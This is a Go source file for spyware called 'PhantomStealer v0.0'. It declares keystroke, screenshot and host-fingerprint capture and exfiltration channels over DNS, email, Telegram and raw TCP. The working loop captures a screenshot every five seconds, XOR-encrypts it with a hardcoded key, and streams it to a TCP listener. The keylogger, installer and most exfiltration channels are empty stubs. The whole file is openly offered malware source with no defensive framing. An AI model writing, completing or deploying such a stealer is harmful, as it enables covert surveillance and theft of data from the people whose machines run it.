package main

import (
	"bufio"
	"bytes"
	"fmt"
	"image/png"
	"net"
	"time"

	"github.com/kbinani/screenshot"
)

type KeystrokeCapture struct {
	Keycap    []byte    `json:"keycap"`
	Timestamp time.Time `json:"timestamp"`
}

type ScreenshotCapture struct {
	Screencap []byte    `json:"screencap"`
	Timestamp time.Time `json:"timestamp"`
}

type FingerprintCapture struct {
	Os        string    `json:"os"`
	Hostname  string    `json:"hostname"`
	Timestamp time.Time `json:"timestamp"`
	// etc
}

type Serializer interface {
	Serialize() []byte
}

type Exfiltrater interface {
	Exfiltrate() error
}

type DnsConnector struct {
	server string
	port   string
}

type EmailConnector struct {
	server   string
	port     string
	username string
	pass     string
}

type TelegramConnector struct {
	server   string
	port     string
	username string
	pass     string
}

type SimpleConnector struct {
	server string
	port   string
}

const (
	EXFIL_MODE_DNS int = iota
	EXFIL_MODE_TELEGRAM
	EXFIL_MODE_EMAIL
	EXFIL_MODE_SIMPLE
)

const (
	CAP_INTERVAL = time.Second * 5
	//ACTIVATION_DATE =
)

func install() {
}

func EncryptDecrypt(input []byte, key string) (output []byte) {
	out := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		out[i] = input[i] ^ key[i%len(key)]
	}

	return out
}

func runLoop() error {
	// Create connector
	connector := SimpleConnector{
		server: "127.0.0.1",
		port:   "8443",
	}

	connectorClient, err := net.Dial("tcp4", net.JoinHostPort(connector.server, connector.port))
	if err != nil {
		return fmt.Errorf("unable to create connection to exfiltration channel: %w", err)
	}

	for {
		fmt.Println("Taking screencap")
		screenCapData, err := createScreenshot()
		if err != nil {
			return fmt.Errorf("error occurred during runloop: %w", err)
		}

		screenCapture := ScreenshotCapture{
			Screencap: screenCapData,
			Timestamp: time.Now(),
		}

		_, err = connectorClient.Write(screenCapture.Serialize())
		if err != nil {
			return fmt.Errorf("unable to write screen cap to connector client: %w", err)
		}
		fmt.Println("Sent!")

		time.Sleep(CAP_INTERVAL)
	}

	// Cleanup

	return nil
}

func createScreenshot() ([]byte, error) {
	bounds := screenshot.GetDisplayBounds(0) // TODO: Multimonitor

	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		panic(err)
	}

	var buf bytes.Buffer
	bWriter := bufio.NewWriter(&buf)

	png.Encode(bWriter, img)

	return buf.Bytes(), nil
}

func recordKeystrokes() {
}

func (kc KeystrokeCapture) Serialize() []byte {
	return nil
}

func (sc ScreenshotCapture) Serialize() []byte {
	encrypted := EncryptDecrypt(sc.Screencap, "e7509a8c032f3bc2a8df1df476f8ef03436185fa")

	return []byte(encrypted)
}

func (fc FingerprintCapture) Serialize() []byte {
	return nil
}

func (dc DnsConnector) Exfiltrate() error {
	return nil
}

func (ec EmailConnector) Exfiltrate() error {
	return nil
}

func (tc TelegramConnector) Exfiltrate() error {
	return nil
}

func main() {
	fmt.Println("PhantomStealer v0.0")

	panic(runLoop())
}
